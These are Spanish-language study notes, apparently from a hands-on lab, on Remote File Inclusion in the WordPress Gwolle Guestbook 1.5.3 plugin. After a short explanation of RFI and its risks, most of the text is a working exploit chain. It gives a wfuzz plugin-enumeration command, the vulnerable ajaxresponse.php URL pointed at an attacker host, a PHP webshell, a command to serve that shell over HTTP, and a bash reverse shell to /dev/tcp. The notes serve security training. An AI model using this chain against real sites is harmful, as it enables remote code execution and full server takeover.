# Remote File Inclusión (RFI)

Tags: #RFI #OWASP #Explotacion #WordPress #OWASP 

La vulnerabilidad **Remote File Inclusion (RFI)** ocurre cuando una aplicación permite **incluir archivos externos (remotos)** sin validar correctamente la entrada del usuario.  
Esto puede dar lugar a la **ejecución de código malicioso** en el servidor.

### Funcionamiento

- El atacante manipula parámetros de entrada (ej. URL o formularios).
- La aplicación descarga e incluye un archivo remoto proporcionado por el atacante.
- El archivo remoto puede contener **código malicioso (PHP, scripts, backdoors, malware)**.

### Riesgos

- Ejecución remota de código en el servidor.
- Instalación de **webshells** o backdoors.
- Compromiso total del sistema.
- Robo o manipulación de datos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- [DVWP](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress:

- [Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)

```bash
# Este tipo de ataques son convenientes cuando:
1. Se puede apuntar a un archivo php y es interpretado 
```

## Enumeración de plugin en WP

```bash 
# Forma de descubrir los plugins existentes en un Wordpress

❯ wfuzz -c --hc=404 -t 200 -w /usr/share/web-content/CMS/wp-plugins.fuzz.txt http://<IP>/FUZZ

	# c = Formato colorizado 
	# hc = Hide Code 404
	# t = Usar 200 peticiones al mismo tiempo
	# w = Ruta absoluta del diccionario a usar
```

## Wordpress plugin Gwolle

```bash 
# Esta vulnerabilidad de RFI se da en un Wordpress en la parte de su plugin 'Gwolle' 1.5.3

❯ http://IP/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://hacker_website/
```

```bash 
# Archivo malicioso a compartir llamado 'wp-load.php'  

<?php 
	system($_GET['cmd']);


Notas:
	1. Terminar el script de la siguiente manera '?>'
```

```bash 
❯ python3 -m http.server 80     # Compartir el archivo 
```

```bash 
# Por lo que ahora en la URL al final debemos de agregar '&cmd=' ya que no se puede tener dos '?cmd=' en una misma URL

?abspath=http://<hacker_website>/&cmd=whoami


# Podemos agregar una revershell en la URL de la siguiente manera:
❯ bash -c "bash -i >& /dev/tcp/IP/443 0>&1"
	# El '&' = %26 urlencodeado
```

